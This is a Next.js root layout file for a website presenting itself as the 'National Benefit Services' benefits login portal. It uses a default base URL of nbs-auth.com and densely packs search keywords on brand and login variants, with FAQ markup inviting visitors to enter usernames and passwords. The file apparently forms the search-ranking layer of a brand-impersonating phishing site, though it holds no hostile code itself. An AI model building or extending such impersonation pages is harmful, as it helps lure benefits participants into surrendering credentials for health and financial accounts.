import type React from "react";
import type { Metadata, Viewport } from "next";
import { Geist } from "next/font/google";
import { Analytics } from "@vercel/analytics/next";
import "./globals.css";

const geist = Geist({ subsets: ["latin"] });

const SITE_BASE_URL = process.env.NEXT_PUBLIC_BASE_URL || 'https://nbs-auth.com'
const SITE_DOMAIN = new URL(SITE_BASE_URL).hostname
const SITE_BRAND = "National Benefit Services";

export const metadata: Metadata = {
  metadataBase: new URL(SITE_BASE_URL),
  title: {
    default: "National Benefit Services - Login",
    template: "%s | National Benefit Services",
  },
  keywords: [
    "National Benefit Services",
    "employee benefits portal",
    "benefits login",
    "FSA account",
    "HSA account",
    "COBRA continuation",
    "benefits enrollment",
    "benefits claims",
    "participant login",
    "new user registration",
    "password reset",
    "benefits administration",
    "dependent care benefits",
    "healthcare benefits",
    "employer benefits portal",
    "broker benefits",
    "secure benefits login",
    "benefits account management",
    "benefits eligibility",
    "benefits customer support",
    
    "nbsbenefits",
    "national benefits services",
    "national benefits",
    "nbs login",
    "National Benefit Services login",
    "NBS Benefits login",
    "nbs HSA administrator",
    "nbs Flexible Spending Account (FSA) administrator",
    "nbs COBRA administration services",
    "nbs Health Reimbursement Arrangement (HRA) administrator",
    "nbs Employee benefits administration",
    "nbs 401(k) retirement plan administration",
    "nbs Third-party benefits administrator (TPA)",
    "nbs Employer benefits administration",
    "nbs retirement plan administration",
    "nbs third party administrator",
    "nbs benefit administration",
    "nbs COBRA administration",
    "nbs 401k administration",
    "nbs FSA administration",
    "nbs HSA administration",
    "nbs TPA benefits",
    "nbs employee benefits administrator",
    "nbs flexible benefit administration",
  ],
  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through National Benefit Services.`,

  authors: [{ name: "National Benefit Services" }],
  creator: "National Benefit Services",
  publisher: "National Benefit Services",
  applicationName: SITE_BRAND,
  referrer: "origin-when-cross-origin",
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      "max-video-preview": -1,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  openGraph: {
    type: "website",
    locale: "en_US",
    title: "National Benefit Services - Login",
    description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through ${SITE_BRAND}.`,
    siteName: SITE_BRAND,
    url: SITE_BASE_URL,
    images: [
      {
        url: `${SITE_BASE_URL}/Nbs%20banner_new.png`,
        width: 1200,
        height: 630,
        alt: `${SITE_BRAND}`,
      },
    ],
  },
  twitter: {
    card: "summary",
    title: "National Benefit Services - Login",
    description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through ${SITE_BRAND}.`,
    images: [`${SITE_BASE_URL}/Nbs%20banner_new.png`],
  },
  icons: {
    icon: "/favicon.ico",
    shortcut: "/favicon.ico",
    apple: "/apple-touch-icon.png",
  },
  category: "Business",
  alternates: {
    canonical: SITE_BASE_URL,
    languages: {
      "en-US": SITE_BASE_URL,
    },
  },
  other: {
    "geo.region": "US",
  },
};

export const viewport: Viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 5,
  themeColor: "#254650",
};

const organizationSchema = {
  "@context": "https://schema.org",
  "@type": "Organization",
  name: SITE_BRAND,
  url: SITE_BASE_URL,
  logo: `${SITE_BASE_URL}/Nbs%20banner_new.png`,
  description:
    "National Benefit Services provides secure access to FSA, HSA, COBRA, and dependent care benefits through our employee benefits portal.",
  sameAs: [],
  contactPoint: {
    "@type": "ContactPoint",
    contactType: "Customer Support",
    availableLanguage: ["en"],
  },
};

const faqSchema = {
  "@context": "https://schema.org",
  "@type": "FAQPage",
  mainEntity: [
    {
      "@type": "Question",
      name: "How do I login to my National Benefit Services account?",
      acceptedAnswer: {
        "@type": "Answer",
        text: "Visit the National Benefit Services participant portal and enter your username and password. Select your user role (Participant, Employer, Broker, or Administrator) and click LOGIN.",
      },
    },
    {
      "@type": "Question",
      name: "What is FSA login and how do I access it?",
      acceptedAnswer: {
        "@type": "Answer",
        text: "FSA (Flexible Spending Account) login allows you to manage your health and dependent care reimbursement accounts through the National Benefit Services portal.",
      },
    },
    {
      "@type": "Question",
      name: "How do I reset my National Benefit Services password?",
      acceptedAnswer: {
        "@type": "Answer",
        text: "Click the forgot password link on the login page. Follow the verification steps and set a new password for your account.",
      },
    },
    {
      "@type": "Question",
      name: "What benefits can I manage through this employee benefits portal?",
      acceptedAnswer: {
        "@type": "Answer",
        text: "You can manage FSA (health and dependent care), HSA, COBRA continuation coverage, and other employee benefits through your secure account.",
      },
    },
  ],
};

const websiteSchema = {
  "@context": "https://schema.org",
  "@type": "WebSite",
  name: SITE_BRAND,
  url: SITE_BASE_URL,
};

const jsonLd = [organizationSchema, faqSchema, websiteSchema];

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en-US">
      <head>
        <link
          href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap"
          rel="stylesheet"
        />
        <link rel="icon" href="/favicon.ico" />
        <link rel="shortcut icon" href="/favicon.ico" />
        <link rel="apple-touch-icon" href="/favicon.ico" />
      </head>
      <body className={`${geist.className} font-sans antialiased`}>
        {jsonLd.map((schema, idx) => (
          <script
            key={idx}
            type="application/ld+json"
            dangerouslySetInnerHTML={{ __html: JSON.stringify(schema) }}
          />
        ))}
        {children}
        <Analytics />
      </body>
    </html>
  );
}
